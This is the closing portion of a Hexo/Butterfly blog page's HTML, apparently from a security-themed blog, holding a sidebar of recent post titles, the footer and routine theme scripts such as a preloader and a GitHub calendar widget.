class="toc-number">2.1.</span> <span class="toc-text">利用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/ac1ae772.html" title="Spring学习">Spring学习</a><time datetime="2023-06-10T08:52:32.000Z" title="发表于 2023-06-10 16:52:32">2023-06-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/5f2c3bbb.html" title="Struts2">Struts2</a><time datetime="2023-01-31T07:50:08.000Z" title="发表于 2023-01-31 15:50:08">2023-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/151cc662.html" title="Fastjson漏洞利用">Fastjson漏洞利用</a><time datetime="2022-12-09T07:28:44.000Z" title="发表于 2022-12-09 15:28:44">2022-12-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/774170cb.html" title="应用安全">应用安全</a><time datetime="2022-11-24T04:08:34.000Z" title="发表于 2022-11-24 12:08:34">2022-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/p/2f610211.html" title="sqlmap使用">sqlmap使用</a><time datetime="2022-11-10T05:21:06.000Z" title="发表于 2022-11-10 13:21:06">2022-11-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By DropAnn</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?dropann";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="dropann";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
